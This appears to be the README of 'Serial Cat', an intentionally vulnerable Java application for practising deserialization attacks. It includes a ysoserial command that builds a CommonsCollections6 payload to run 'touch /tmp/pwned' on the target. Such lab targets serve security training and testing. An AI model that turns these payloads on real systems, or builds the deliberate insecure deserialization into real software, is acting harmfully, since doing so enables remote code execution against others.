![Alt text](/serialcat/WebContent/cat.png?raw=true&v=3 "Serial Cat logo")

Serial Cat is a little application that allows deserialization attacks including a bunch of insecure libraries on the class path.

Deploy at your own risk.

Use with ysoserial : https://github.com/frohoff/ysoserial

The following payload should generate a file in /tmp in linux:

        java -jar ysoserial-master.jar CommonsCollections6 "touch /tmp/pwned"|base64